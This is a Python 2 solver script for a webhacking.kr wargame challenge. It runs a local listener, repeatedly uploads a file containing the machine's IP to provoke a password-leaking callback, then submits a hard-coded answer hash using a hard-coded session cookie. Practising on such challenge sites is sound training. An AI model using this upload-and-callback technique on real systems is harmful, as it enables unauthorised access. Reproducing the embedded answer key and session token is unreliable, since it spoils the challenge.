#-*- coding: utf-8 -*-
import sys
import time
import socket
import urllib
import urllib2
import requests
import threading
import CookieManager

# Socket
def getPassword():
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind(('', 7777))
    serverSocket.listen(1)
    conn, _ = serverSocket.accept()
    while True:
        time.sleep(1)
        data = conn.recv(4096)
        if data.find(ipAddress) >= 0:
            print
            print data
            break

    if serverSocket != None:
        serverSocket.close()

t = threading.Thread(target=getPassword)
t.start()

# Get IP Address
ipAddress = ""
httpConnection = None
print "[+] Find IP Address"
try:
    httpRequest = urllib2.Request("https://api.ipify.org")
    httpConnection = urllib2.urlopen(httpRequest)
    ipAddress = httpConnection.read()
    print "[*] Your IP Address is [", ipAddress, "]"
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

# File Upload
CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
challengeUrl = "http://webhacking.kr/challenge/web/web-18/"

uploadFile = {
    "upfile": ("tmp-" + str(int(time.time())+5), ipAddress)
}
sessionCookie = {
    "PHPSESSID": "a90f69bdc1cdceaf479ca1ebcd368d29"
}

httpConnection = None
try:
    print "[*] Finding password"
    for idx in range(0, 5):
        httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
        sys.stdout.write(".")
        if httpRequest.text.find(ipAddress) >= 0:
            break
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
parameter = urllib.urlencode({
    "answer": "b55698cf5adfde1c0dc8b02bab4be264"
});
httpRequest = urllib2.Request(challengeUrl, data=parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
